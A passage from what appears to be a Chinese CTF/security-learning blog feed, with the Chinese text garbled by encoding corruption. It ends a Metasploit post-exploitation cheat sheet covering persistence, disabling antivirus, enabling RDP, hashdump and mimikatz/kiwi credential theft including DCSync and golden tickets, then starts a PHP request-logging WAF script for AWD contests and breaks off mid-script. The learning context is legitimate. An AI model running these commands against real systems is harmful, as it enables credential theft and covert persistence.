æšä¸¾åŸŸå†…æ‰€æœ‰ç”¨æˆ·ï¼Œå½“ç„¶è¿™é‡Œçš„ç›®æ ‡æœºä¸å±äºä»»ä½•åŸŸã€‚</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>run persistence   <span class=\"token comment\"># å°† meterpreter æœ¨é©¬å†™å…¥ç¡¬ç›˜ï¼Œä¸‹æ¬¡å¼€æœºæ—¶è‡ªå¯</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>run post/multi/gather/wlan_geolocate  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># åŸºäº wlan è¿›è¡Œåœ°ç†ä½ç½®ç¡®è®¤ï¼Œè·å¾—åœ°ç†ä¿¡æ¯è‡ªåŠ¨ç”Ÿæˆ txt æ–‡ä»¶ä¿åœ¨ /root/.msf6/loot ä¸‹ï¼ˆéšè—æ–‡ä»¶å¤¹ï¼‰</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>run hashdump                                            <span class=\"token comment\"># è·å–ç›®æ ‡ç³»ç»Ÿç”¨æˆ·å¯†ç  hash</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>run service_manager                                     <span class=\"token comment\"># ç›®æ ‡ç³»ç»ŸæœåŠ¡ç®¡ç†ï¼Œ-l å‚æ•°å¸¸ç”¨äºä¿¡æ¯æ”¶é›†</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>run post/windows/wlan/wlan_profile                      <span class=\"token comment\"># ç”¨äºè¯»å–ç›®æ ‡ä¸»æœº WiFi å¯†ç ã€‚</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>run post/windows/manage/migrate                \t\t\t<span class=\"token comment\"># è‡ªåŠ¨è¿›ç¨‹è¿ç§»</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>run post/windows/gather/checkvm                \t\t\t<span class=\"token comment\"># æŸ¥çœ‹ç›®æ ‡ä¸»æœºæ˜¯å¦è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Š</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>run post/windows/manage/killav                \t\t\t<span class=\"token comment\"># å…³é—­æ€æ¯’è½¯ä»¶</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>run post/windows/manage/enable_rdp            \t\t\t<span class=\"token comment\"># å¼€å¯è¿œç¨‹æ¡Œé¢æœåŠ¡</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>run post/windows/manage/autoroute              \t\t\t<span class=\"token comment\"># æŸ¥çœ‹è·¯ç”±ä¿¡æ¯</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>run post/windows/gather/enum_logged_on_users    \t\t<span class=\"token comment\"># åˆ—ä¸¾å½“å‰ç™»å½•çš„ç”¨æˆ·</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>run post/windows/gather/enum_applications       \t\t<span class=\"token comment\"># åˆ—ä¸¾åº”ç”¨ç¨‹åº</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>run post/windows/gather/credentials/windows_autologin \t<span class=\"token comment\"># æŠ“å–è‡ªåŠ¨ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç </span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>run post/windows/gather/smart_hashdump               \t<span class=\"token comment\"># dump å‡ºæ‰€æœ‰ç”¨æˆ·çš„ hash</span></pre></td></tr></table></figure><h2 id=\"è·å–ç”¨æˆ·å¯†ç \"><a class=\"anchor\" href=\"#è·å–ç”¨æˆ·å¯†ç \">#</a> è·å–ç”¨æˆ·å¯†ç </h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>run windows/gather/credentials/windows_autologin   <span class=\"token comment\"># å½“ç”¨æˆ·è‡ªåŠ¨ç™»å½•æ—¶æŠ“å–å¯†ç </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>run hashdump  <span class=\"token comment\"># hashdump æ¨¡å—å¯ä»¥ä» SAM æ•°æ®åº“ä¸­å¯¼å‡ºæœ¬åœ°ç”¨æˆ·è´¦å·ï¼Œè¯¥å‘½ä»¤çš„ä½¿ç”¨å‰ getsystemã€‚</span></pre></td></tr></table></figure><p>å¯¼å‡ºçš„æ•°æ®æ ¼å¼æ˜¯è¿™æ ·çš„ï¼š</p>\n<pre><code class=\"language-SAM\">ç”¨æˆ·å:SID:LMå“ˆå¸Œ:NTLMå“ˆå¸Œ:::\n</code></pre>\n<p>é€šè¿‡<a href=\"https://www.cmd5.com/?lailu=www.itdka.cn\"> md5 åœ¨çº¿è§£å¯†ç ´è§£ï¼Œmd5 è§£å¯†åŠ å¯† (cmd5.com)</a> æ¥æŸ¥è¯¢è¿™äº›å“ˆå¸Œå€¼</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>run windows/gather/smart_hashdump</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># éœ€è¦ç³»ç»Ÿæƒé™ã€‚åŠŸèƒ½æ›´å¼ºå¤§ï¼Œå¦‚æœå½“å‰ç”¨æˆ·æ˜¯åŸŸç®¡ç†å‘˜ç”¨æˆ·ï¼Œåˆ™å¯ä»¥å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„ hashã€‚</span></pre></td></tr></table></figure><p>è¿˜å¯ä»¥é€šè¿‡<span class=\"kbd blue\"> kiwi æ¨¡å—</span>ã€<span class=\"kbd blue\">mimikatz æ¨¡å—</span>è·å–ç”¨æˆ·å¯†ç ã€‚</p>\n<h1 id=\"powershellæ¨¡å—\"><a class=\"anchor\" href=\"#powershellæ¨¡å—\">#</a> powershell æ¨¡å—</h1>\n<p>æŠ±æ­‰ğŸ˜µâ€ğŸ’«ğŸ˜µâ€ğŸ’«è¿™é‡Œè¿˜æ˜¯ä½œè€…çš„çŸ¥è¯†è’åŸğŸ¥¹ğŸ¥¹</p>\n<h1 id=\"kimimimikatzæ¨¡å—\"><a class=\"anchor\" href=\"#kimimimikatzæ¨¡å—\">#</a> kimiï¼ˆmimikatzï¼‰æ¨¡å—</h1>\n<blockquote>\n<p><strong>mimikatz æ¨¡å—å·²ç»åˆå¹¶å…¥ kiwi æ¨¡å—ä¸­</strong></p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>creds_allï¼š             <span class=\"token comment\">#åˆ—ä¸¾æ‰€æœ‰å‡­æ®</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>creds_kerberosï¼š        <span class=\"token comment\">#åˆ—ä¸¾æ‰€æœ‰ kerberos å‡­æ®</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>creds_msvï¼š             <span class=\"token comment\">#åˆ—ä¸¾æ‰€æœ‰ msv å‡­æ®</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>creds_sspï¼š             <span class=\"token comment\">#åˆ—ä¸¾æ‰€æœ‰ ssp å‡­æ®</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>creds_tspkgï¼š           <span class=\"token comment\">#åˆ—ä¸¾æ‰€æœ‰ tspkg å‡­æ®</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>creds_wdigestï¼š         <span class=\"token comment\">#åˆ—ä¸¾æ‰€æœ‰ wdigest å‡­æ®</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>dcsyncï¼š                <span class=\"token comment\">#é€šè¿‡ DCSync æ£€ç´¢ç”¨æˆ·å¸æˆ·ä¿¡æ¯</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>dcsync_ntlmï¼š           <span class=\"token comment\">#é€šè¿‡ DCSync æ£€ç´¢ç”¨æˆ·å¸æˆ· NTLM æ•£åˆ—ã€SID å’Œ RID</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>golden_ticket_createï¼š  <span class=\"token comment\">#åˆ›å»ºé»„é‡‘ç¥¨æ®</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>kerberos_ticket_listï¼š  <span class=\"token comment\">#åˆ—ä¸¾ kerberos ç¥¨æ®</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>kerberos_ticket_purgeï¼š <span class=\"token comment\">#æ¸…é™¤ kerberos ç¥¨æ®</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>kerberos_ticket_useï¼š   <span class=\"token comment\">#ä½¿ç”¨ kerberos ç¥¨æ®</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>kiwi_cmdï¼š              <span class=\"token comment\">#æ‰§è¡Œ mimikatz çš„å‘½ä»¤ï¼Œåé¢æ¥ mimikatz.exe çš„å‘½ä»¤</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>lsa_dump_samï¼š          <span class=\"token comment\">#dump å‡º lsa çš„ SAM</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>lsa_dump_secretsï¼š      <span class=\"token comment\">#dump å‡º lsa çš„å¯†æ–‡</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>password_changeï¼š       <span class=\"token comment\">#ä¿®æ”¹å¯†ç </span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>wifi_listï¼š             <span class=\"token comment\">#åˆ—å‡ºå½“å‰ç”¨æˆ·çš„ wifi é…ç½®æ–‡ä»¶</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>wifi_list_sharedï¼š      <span class=\"token comment\">#åˆ—å‡ºå…±äº« wifi é…ç½®æ–‡ä»¶ / ç¼–ç </span></pre></td></tr></table></figure><p>kiwi_cmd æ¨¡å—å¯ä»¥è®©æˆ‘ä»¬ä½¿ç”¨ mimikatz çš„å…¨éƒ¨åŠŸèƒ½ï¼Œè¯¥å‘½ä»¤åé¢æ¥ mimikatz.exe çš„å‘½ä»¤:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>kiwi_cmd sekurlsa::logonpasswords</pre></td></tr></table></figure><h1 id=\"stdapiæ¨¡å—\"><a class=\"anchor\" href=\"#stdapiæ¨¡å—\">#</a> stdapi æ¨¡å—</h1>\n<p>æŠ±æ­‰ğŸ˜µâ€ğŸ’«ğŸ˜µâ€ğŸ’«è¿™é‡Œè¿˜æ˜¯ä½œè€…çš„çŸ¥è¯†è’åŸğŸ¥¹ğŸ¥¹</p>\n<h1 id=\"ä»¤ç‰Œå‡å†’\"><a class=\"anchor\" href=\"#ä»¤ç‰Œå‡å†’\">#</a> ä»¤ç‰Œå‡å†’</h1>\n<p>æŠ±æ­‰ğŸ˜µâ€ğŸ’«ğŸ˜µâ€ğŸ’«è¿™é‡Œè¿˜æ˜¯ä½œè€…çš„çŸ¥è¯†è’åŸğŸ¥¹ğŸ¥¹</p>\n<h1 id=\"pivotä»£ç†\"><a class=\"anchor\" href=\"#pivotä»£ç†\">#</a> pivot ä»£ç†</h1>\n<p>æŠ±æ­‰ğŸ˜µâ€ğŸ’«ğŸ˜µâ€ğŸ’«è¿™é‡Œè¿˜æ˜¯ä½œè€…çš„çŸ¥è¯†è’åŸğŸ¥¹ğŸ¥¹</p>\n<p><a href=\"https://www.cnblogs.com/diligenceday/p/11028462.html\">è¶…å®ç”¨ï¼æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•ç”¨ MSF è¿›è¡Œåæ¸—é€æµ‹è¯•ï¼ - æ–¹æ–¹å’Œåœ†åœ† - åšå®¢å›­ (cnblogs.com)</a></p>\n<h1 id=\"è‡ªå®šä¹‰æ”»å‡»æ¨¡å—\"><a class=\"anchor\" href=\"#è‡ªå®šä¹‰æ”»å‡»æ¨¡å—\">#</a> è‡ªå®šä¹‰æ”»å‡»æ¨¡å—</h1>\n<p>æŠ±æ­‰ğŸ˜µâ€ğŸ’«ğŸ˜µâ€ğŸ’«è¿™é‡Œè¿˜æ˜¯ä½œè€…çš„çŸ¥è¯†è’åŸğŸ¥¹ğŸ¥¹</p>\n<p><mark><strong>ä¸åŒçš„æ”»å‡»ç”¨åˆ°çš„æ­¥éª¤ä¹Ÿä¸ä¸€æ ·ï¼Œè¿™ä¸æ˜¯ä¸€æˆä¸å˜çš„ï¼Œéœ€è¦çµæ´»ä½¿ç”¨ã€‚</strong></mark></p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†æ”»å‡»ä»£ç å†™å…¥ <code>configure.rc</code> ï¼ˆåªè¦æ˜¯ä»¥ <code>.rc</code>  ç»“å°¾çš„æ–‡ä»¶ï¼‰é…ç½®æ–‡ä»¶ä¸­ï¼Œ</p>\n</li>\n<li class=\"lvl-2\">\n<p>ç„¶åä½¿ç”¨å‘½ä»¤ <code>msfconsole -r configure.rc</code>  è¿›è¡Œè‡ªåŠ¨æ”»å‡»</p>\n<p>å‚è€ƒè¿™ç¯‡æ–‡ç« <a href=\"https://blog.csdn.net/weixin_45588247/article/details/119488520?spm=1001.2014.3001.5501\">ã€æ¼æ´å¤ç°ã€‘RDP è¿œç¨‹æ¡Œé¢æ¼æ´å¤ç° (CVE-2019-0708)_exploit/cve-2019-0708-CSDN åšå®¢</a></p>\n</li>\n</ul>\n<h1 id=\"å°è¯•ç‰›åˆ€\"><a class=\"anchor\" href=\"#å°è¯•ç‰›åˆ€\">#</a> å°è¯•ç‰›åˆ€</h1>\n<p>æŠ±æ­‰ğŸ˜µâ€ğŸ’«ğŸ˜µâ€ğŸ’«è¿™é‡Œè¿˜æ˜¯ä½œè€…çš„çŸ¥è¯†è’åŸğŸ¥¹ğŸ¥¹</p>\n<h1 id=\"msf-guiå›¾å½¢åŒ–ç•Œé¢\"><a class=\"anchor\" href=\"#msf-guiå›¾å½¢åŒ–ç•Œé¢\">#</a> MSF-GUI å›¾å½¢åŒ–ç•Œé¢</h1>\n<p>æŠ±æ­‰ğŸ˜µâ€ğŸ’«ğŸ˜µâ€ğŸ’«è¿™é‡Œè¿˜æ˜¯ä½œè€…çš„çŸ¥è¯†è’åŸğŸ¥¹ğŸ¥¹</p>\n<p>å®‰è£…æ•™ç¨‹<a href=\"https://www.yuque.com/vipersec/install/olg1ua\">é¦–æ¬¡å®‰è£… (yuque.com)</a></p>\n<p>ç”¨å®‰è£…æ•™ç¨‹è„šæœ¬è‡ªåŠ¨åŒ–å®‰è£…å¯ä»¥ä¸ç”¨ç¹ççš„æ‰‹åŠ¨éƒ¨ç½²ï¼Œä¹Ÿå¯ä»¥ä¸ç”¨ git cloneã€‚æ‡’äººå°±è¦æ‡’åˆ°æè‡´ã€‚</p>\n<p><span class=\"spoiler\" title=\"ä½ çŸ¥é“å¾—å¤ªå¤šäº†\">è¿˜æ²¡ç”¨è¿‡ï¼Œçœ‹ç€å¥½å±Œã€‚</span></p>\n<p>é¡¹ç›®åœ°å€ï¼š<a href=\"https://github.com/FunnyWolf/Viper\">FunnyWolf/Viper: Attack Surface Management &amp; Red Team Simulation Platform äº’è”ç½‘æ”»å‡»é¢ç®¡ç† &amp; çº¢é˜Ÿæ¨¡æ‹Ÿå¹³å° (github.com)</a></p>\n<h1 id=\"with-powers-comes-responsilities\"><a class=\"anchor\" href=\"#with-powers-comes-responsilities\">#</a> With Powers Comes Responsilities</h1>\n<h2 id=\"metasploitçš„å¼ºå¤§\"><a class=\"anchor\" href=\"#metasploitçš„å¼ºå¤§\">#</a> Metasploit çš„å¼ºå¤§</h2>\n<p>åˆæ­¥å­¦ä¹ å®Œ Metasploit æ„Ÿè§‰åˆ°å®ƒçš„å¼ºå¤§ä¹‹å¤„ï¼Œä¼šä¸ä¼šæœ‰å½“ GPT å­¦ä¼š msf ä¹‹åä¹±æ€ä¸–ç•Œä¸€åˆ‡ç”Ÿçµçš„æƒ¶æï¼Ÿæˆ–è®¸æˆ‘æ‰æ„è¯†åˆ°è¿™å°±æ˜¯ç½‘å®‰äººçš„ä½¿å‘½å§ã€‚</p>\n<p><img loading=\"lazy\" data-src=\"https://s2.loli.net/2024/05/05/A8yelkGqMTRvP6a.jpg\" alt=\"With Great Power Comes Great Responsibilities\" /></p>\n<p>ä¸å›å…±å‹‰ã€‚</p>\n<h1 id=\"å‚è€ƒé“¾æ¥\"><a class=\"anchor\" href=\"#å‚è€ƒé“¾æ¥\">#</a> å‚è€ƒé“¾æ¥</h1>\n<p><a href=\"http://t.csdnimg.cn/mxbtk\">http://t.csdnimg.cn/mxbtk</a></p>\n<p><a href=\"http://t.csdnimg.cn/PPj38\">http://t.csdnimg.cn/PPj38</a></p>\n<p><a href=\"http://t.csdnimg.cn/ucKKL\">http://t.csdnimg.cn/ucKKL</a></p>\n<p><a href=\"https://blog.csdn.net/qq_43307937/article/details/109701503\">Meterpreter çš„å¸¸ç”¨å‘½ä»¤åˆé›†_meterpreter å‘½ä»¤å¤§å…¨ - CSDN åšå®¢</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_45588247/article/details/119519411?spm=1001.2014.3001.5501\">ã€å·¥å…·ä½¿ç”¨ã€‘â€”â€”MSF ä½¿ç”¨_ä½¿ç”¨ MSF æŠ“å–ç”¨æˆ·å¯†ç _msf è¯»å– windows å¯†ç  - CSDN åšå®¢</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_45588247/article/details/119497964\">ã€å·¥å…·ä½¿ç”¨ã€‘â€”â€”MSF ä½¿ç”¨_MSF ä¸­ kiwi (mimikatz) æ¨¡å—çš„ä½¿ç”¨_load kiwi-CSDN åšå®¢</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_45588247/article/details/119614618#t13\">ã€å·¥å…·ä½¿ç”¨ã€‘â€”â€”Metasploit (MSF) ä½¿ç”¨è¯¦è§£ (è¶…è¯¦ç»†)-CSDN åšå®¢</a></p>\n<p><a href=\"https://www.freebuf.com/column/203008.html\">Metasploit å…¥é—¨ç³»åˆ— (ä¹)â€”â€”Meterpreter (äºŒ) - FreeBuf ç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>\n<p><a href=\"https://www.cnblogs.com/dogecheng/p/11478953.html\">MSFâ€”â€”Payload æ¨¡å—ï¼ˆäºŒï¼‰ - é‚£å°‘å¹´å’Œç‹— - åšå®¢å›­ (cnblogs.com)</a></p>\n",
            "tags": [
                "Penetration Test",
                "kali tools",
                "Penetration Test"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/AWD-waf%E8%84%9A%E6%9C%AC/",
            "url": "https://ctf-learner.github.io/post/AWD-waf%E8%84%9A%E6%9C%AC/",
            "title": "AWD-wafè„šæœ¬",
            "date_published": "2024-04-19T13:32:39.640Z",
            "content_html": "<p><span class=\"label success\">ä¸Šæ¬¡æ›´æ–°æ—¶é—´ï¼š2024-04-19</span><br />\n è„šæœ¬æ”¶é›†è‡ªç½‘ç»œï¼Œçº¿ä¸‹æ¯”èµ›å¯èƒ½ä¸å…è®¸é€šé˜²ï¼Œå‡†å¤‡äº†ä¸¤ä¸ªæ˜“äºåŒ…å«çš„ waf</p>\n<h1 id=\"php-wafè„šæœ¬\"><a class=\"anchor\" href=\"#php-wafè„šæœ¬\">#</a> php waf è„šæœ¬</h1>\n<div class=\"note success\">\n<div class=\"tab\" data-id=\"id1\" data-title=\"wafè„šæœ¬1\">\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$log_file_path</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'./log.txt'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$blackIp</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'192.168.43.150'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * [access æ—¥å¿—è®°å½•æ¨¡å—]</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * @return [type] [description]</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">access</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">global</span> <span class=\"token variable\">$log_file_path</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token operator\">!=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token variable\">$tmp</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmp</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"filename\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"contents\"</span><span class=\"token operator\">=></span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token variable\">$flow</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Userip'</span><span class=\"token operator\">=></span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Path'</span> <span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'http://'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_NAME'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">':'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"SERVER_PORT\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REQUEST_URI\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Post'</span><span class=\"token operator\">=></span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token string double-quoted-string\">\"File\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$tmp</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Cookie'</span><span class=\"token operator\">=></span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Time'</span><span class=\"token operator\">=></span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y-m-s h:i:s'</span><span class=\"token punctuation\">,</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token variable\">$flow</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Userip'</span><span class=\"token operator\">=></span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Path'</span> <span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'http://'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_NAME'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">':'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"SERVER_PORT\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REQUEST_URI\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Post'</span><span class=\"token operator\">=></span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Cookie'</span><span class=\"token operator\">=></span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Time'</span><span class=\"token operator\">=></span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y-m-s h:i:s'</span><span class=\"token punctuation\">,</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token variable\">$log_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$log_file_path</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$log_path</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token operator\">.</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flow</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td 